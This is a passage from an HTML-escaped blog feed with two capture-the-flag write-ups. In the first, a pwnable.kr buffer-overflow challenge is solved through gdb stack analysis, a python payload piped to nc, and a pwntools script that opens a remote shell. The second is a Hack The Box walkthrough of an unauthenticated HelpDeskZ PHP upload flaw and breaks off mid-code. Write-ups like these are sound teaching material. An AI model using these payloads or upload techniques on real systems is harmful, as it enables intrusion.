Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;pretty-straightforward-we-have-the-vulnerable-binary-its-source-code-and-the-port-where-its-running&quot;&gt;Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;code-analysis&quot;&gt;Code Analysis&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-code-&quot;&gt;Let’s take a look at the code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
void func(int key){
	char overflowme[32];
	printf(&quot;overflow me : &quot;);
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system(&quot;/bin/sh&quot;);
	}
	else{
		printf(&quot;Nah..\n&quot;);
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-are-two-functions-the-main-function-and-another-function-called-func&quot;&gt;There are two functions, the main function and another function called &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;func&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void func(int key){
	char overflowme[32];
	printf(&quot;overflow me : &quot;);
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system(&quot;/bin/sh&quot;);
	}
	else{
		printf(&quot;Nah..\n&quot;);
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;breakdown-&quot;&gt;Breakdown :&lt;/h4&gt;
&lt;h4 id=&quot;the-function-takes-a-variable-called-key-it-starts-by-creating-a-variable-called-overflowme-and-sets-a-buffer-of-32-chars-for-it--char-overflowme32&quot;&gt;The function takes a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, it starts by creating a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; and sets a buffer of 32 chars for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;char overflowme[32];&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-it-prints-overflow-me--printfoverflow-me----and-waits-for-our-input-which-will-be-saved-in-the-variable-overflowme-getsoverflowme&quot;&gt;Then it prints &lt;code class=&quot;highlighter-rouge&quot;&gt;overflow me :&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;overflow me : &quot;);&lt;/code&gt;)  and waits for our input which will be saved in the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;gets(overflowme);&lt;/code&gt;)&lt;/h4&gt;
&lt;h4 id=&quot;after-that-theres-an-if-statement-that-checks-if-the-variable-key-is-equal-to-0xcafebabe-ifkey--0xcafebabe-if-thats-true-it-will-spawn-a-shell-systembinsh-if-key-is-equal-to-anything-else-it-will-print-nah-printfnahn&quot;&gt;After that there’s an if statement that checks if the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;if(key == 0xcafebabe){&lt;/code&gt;). If that’s true it will spawn a shell (&lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt;), if &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to anything else it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;Nah..&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Nah..\n&quot;);&lt;/code&gt;)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;main-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;basically-what-the-main-function-is-doing-is-just-calling-the-function-func-giving-key-the-value-of-0xdeadbeef&quot;&gt;Basically what the main function is doing is just calling the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; giving &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-need-to-make-key-equal-to-0xcafebabe-instead-of-0xdeadbeef-to-make-it-spawn-a-shell-we-control-overflowme-but-we-dont-control-key-if-we-can-cause-a-buffer-overflow-we-will-be-able-to-overwrite-key-and-obviously-overflowme-is-vulnerable&quot;&gt;So we need to make &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; to make it spawn a shell. We control &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; but we don’t control &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;. If we can cause a buffer overflow we will be able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, and obviously &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; is vulnerable.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;examining-the-binary-exploitation&quot;&gt;Examining the Binary, Exploitation&lt;/h3&gt;
&lt;h4 id=&quot;i-ran-the-program-and-tested-it-a-couple-of-times-first-one-with-a-short-input-&quot;&gt;I ran the program and tested it a couple of times. First one with a short input :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;second-one-with-a-longer-input-and-it-crashed&quot;&gt;Second one with a longer input and it crashed:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;important-thing-to-note-here-we-dont-want-to-know-the-offset-or-where-the-program-exactly-crashes-this-is-because-we-dont-need-to-overwrite-eip-we-need-to-overwrite-a-variables-value-and-thats-located-on-the-stack-so-giving-the-program-a-pattern-and-finding-the-offset-wont-help-because-we-need-to-know-where-0xdeadbeef-is-located-on-the-stack&quot;&gt;Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; is located on the stack.&lt;/h4&gt;
&lt;h4 id=&quot;its-time-for-gdb-i-started-gdb-and-created-a-break-point-at-main-break-main-then-i-started-the-program-r-&quot;&gt;It’s time for &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;. I started &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and created a break point at &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;break main&lt;/code&gt;) then I started the program (&lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-stopped-at-the-break-point-we-need-to-disassemble-the-function-func-to-get-the-address-of-the-compare-instruction-that-compares-between-the-value-of-key-and-0xcafebabe-to-set-another-break-point-there-and-look-at-the-stack&quot;&gt;It stopped at the break point. We need to disassemble the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; to get the address of the compare instruction that compares between the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; to set another break point there and look at the stack.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;disas func&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-the-cmpl-compare-logical-instruction-at-0x0000654-lets-set-a-break-point-exactly-before-it-&quot;&gt;We can see the &lt;a href=&quot;https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; (Compare Logical)&lt;/a&gt; instruction at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000654&lt;/code&gt;, Lets set a break point exactly before it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;break *0x80000654&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-continue-the-execution-c-and-wait-for-our-break-point&quot;&gt;Now let’s continue the execution (&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;) and wait for our break point.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-gave-it-a-short-input-because-we-dont-need-to-crash-it-and-overwrite-stuff-on-the-stack-we-just-need-to-look-at-the-stack-during-a-normal-execution-to-locate-0xdeadbeef&quot;&gt;I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-hitting-the-second-break-point-lets-look-at-the-stack-&quot;&gt;After hitting the second break point let’s look at the stack :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;x/50wx $esp&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;0xdeadbeef-appears-at-the-first-row-in-front-of-0xbffff2e0-and-our-input-starts-to-appear-at-the-last-row-in-front-of-0xbffff2a0-we-can-locate-the-distance-between-our-input-and-0xdeadbeef-easily-each-hex-value-represents-4-chars-0x41414141--aaaa-and-we-have-exactly-13-of-them-before-0xdeadbeef-1--4--4--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; appears at the first row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2e0&lt;/code&gt; and our input starts to appear at the last row in front of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff2a0&lt;/code&gt;. We can locate the distance between our input and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; easily, each hex value represents 4 chars (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141 == AAAA&lt;/code&gt;) and we have exactly 13 of them before &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;1 + 4 + 4 + 4&lt;/code&gt;).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-give-the-program-exactly-52-chars-then-0xcafebabe-and-eventually-0xdeadbeef-will-be-overwritten&quot;&gt;We need to give the program exactly 52 chars then &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; and eventually &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; will be overwritten.&lt;/h4&gt;
&lt;h4 id=&quot;lets-try-it-i-used-python-to-print-the-payload-in-a-file-then-i-piped-that-file-to-the-nc-connection-&quot;&gt;Let’s try it, I used python to print the payload in a file then I piped that file to the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; connection :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 52 + '\xbe\xba\xfe\xca'&quot; &amp;gt; ./payload&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;(cat payload &amp;amp;&amp;amp; cat) | nc pwnable.kr 9000&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pwned-&quot;&gt;Pwned !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;writing-an-exploit-with-pwntools&quot;&gt;Writing an Exploit with pwntools&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-cool-things-about-pwntools-is-the-simplicity-combined-with-the-simplicity-of-this-exploit-will-make-it-just-4-lines-of-code&quot;&gt;One of the cool things about &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code.&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-we-need-to-do-is-to-import-pwntools--from-pwn-import-&quot;&gt;First thing we need to do is to import &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;from pwn import *&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-need-to-store-our-payload-in-a-variable--payload--a--52--xbexbaxfexca&quot;&gt;We need to store our payload in a variable : &lt;code class=&quot;highlighter-rouge&quot;&gt;payload = 'A' * 52 + '\xbe\xba\xfe\xca'&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-we-need-to-initiate-the-connection-and-assign-a-variable-for-it--shell--remotepwnablekr-9000&quot;&gt;Then we need to initiate the connection and assign a variable for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell = remote('pwnable.kr' ,9000)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-that-we-will-send-the-payload--shellsendpayload&quot;&gt;After that we will send the payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.send(payload)&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;and-finally-we-can-interact-with-our-shell--shellinteractive&quot;&gt;And finally we can interact with our shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.interactive()&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbe\xba\xfe\xca&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pwned-again-&quot;&gt;Pwned again !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;h4 id=&quot;previous-pwn-write-up--pwnablekr---fd&quot;&gt;Previous pwn write-up : &lt;a href=&quot;/pwn/fd/&quot;&gt;pwnable.kr - fd&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Binary Exploitation" /><category term="Buffer Overflow" /><category term="code analysis" /><category term="Exploit Development" /><category term="c" /><category term="Python" /><summary type="html">Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/bof/0.png" /></entry><entry><title type="html">Hack The Box - Help</title><link href="http://localhost:4000/hack-the-box/help/" rel="alternate" type="text/html" title="Hack The Box - Help" /><published>2019-06-08T00:00:00+02:00</published><updated>2019-06-08T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/help</id><content type="html" xml:base="http://localhost:4000/hack-the-box/help/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-help-retired-and-heres-my-write-up-about-it-help-was-a-nice-easy-machine-i-dont-really-have-much-to-say-about-it-to-get-an-initial-shell-on-the-box-we-will-exploit-a-non-authenticated-file-upload-vulnerability-in-a-web-application-called-helpdeskz-this-vulnerability-could-be-exploited-in-two-ways-either-by-editing-the-exploit-to-include-a-higher-range-or-by-getting-credentials-to-the-web-app-and-editing-some-settings-to-make-the-exploit-work-after-getting-a-shell-the-privilege-escalation-part-is-just-a-kernel-exploit-its-a-linux-box-and-its-ip-is-101010121-i-added-it-to-etchosts-as-helphtb-lets-jump-right-in-&quot;&gt;Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt;. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.121&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;help.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC help.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/help/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22-and-http-on-two-ports--80-and-3000-whats-running-on-port-80-is-an-apache2-server-and-on-port-3000-is-nodejs-express-framework&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on two ports : 80 and 3000. What’s running on port 80 is an &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache2&lt;/code&gt; server and on port 3000 is &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express Framework&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;on-port-80-theres-just-the-default-apache-index-page-&quot;&gt;On port 80 there’s just the default &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; index page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-ran-gobuster-and-got-these-results-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-support-and-there-was-a-web-application-called-helpdeskz-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/support&lt;/code&gt; and there was a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-upload-vulnerability&quot;&gt;File Upload Vulnerability&lt;/h3&gt;
&lt;h4 id=&quot;a-quick-search-and-i-found-an-unauthenticated-file-upload-vulnerability-that-takes-advantage-of-the-weak-file-renaming-function-thats-responsible-for-renaming-tickets-attachments-and-the-ability-to-upload-php-files-because-they-are-allowed-by-default&quot;&gt;A quick search and I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;unauthenticated file upload vulnerability&lt;/a&gt; that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files because they are allowed by default.&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -&lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;exploit-db&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-wanted-to-test-if-i-can-really-upload-php-so-i-went-to-submit-a-ticket-and-i-attached-a-test-file-&quot;&gt;I wanted to test if I can really upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; so I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;Submit a Ticket&lt;/code&gt; and I attached a test file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/help/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-got-file-is-not-allowed&quot;&gt;And I got &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;luckily-helpdeskz-is-an-open-source-application-so-i-checked-the-source-on-github&quot;&gt;Luckily &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; is an open-source application so I checked the source on &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github&lt;/a&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;the-script-that-handles-tickets-submissions-is-called-new-ticketphp-it-can-be-found-in-includesparser&quot;&gt;The script that handles tickets submissions is called &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;new-ticket.php&lt;/code&gt;&lt;/a&gt;. It can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/parser&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;heres-the-part-for-the-attachments-&quot;&gt;Here’s the part for the attachments :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(is_array($attachments)){
		$save_dir = UPLOAD_DIR;
		foreach($attachments as $attachment) {
		  // get the attachment name
		  $filename = $attachment-&amp;gt;filename;
		  // write the file to the directory you want to save it in
		  if ($fp = fopen($save_dir.$filename, 'w')) {
			while($bytes = $attachment-&amp;gt;read()) {
			  fwrite($fp, $bytes);
			}
			fclose($fp);
		  }
			
		  $filesize = @filesize(UPLOAD_DIR.$filename);
		  if($filesize){
			  $fileinfo = array('name' =&amp;gt; $filename, 'size' =&amp;gt; $filesize);
			  $fileverification = verifyAttachment($fileinfo);
			  if($fileverification['msg_code'] == 0){
				$ext = pathinfo($filename, PATHINFO_EXTENSION);
